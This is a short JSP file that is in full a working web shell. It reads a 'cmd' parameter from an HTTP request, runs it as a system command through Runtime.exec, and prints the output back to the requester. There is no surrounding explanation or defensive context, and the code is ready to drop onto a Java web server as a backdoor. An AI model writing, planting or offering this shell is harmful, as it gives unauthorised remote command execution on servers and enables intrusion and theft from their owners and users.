<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    InputStream in = p.getInputStream();
    int a;
    while((a = in.read()) != -1) out.print((char)a);
%>
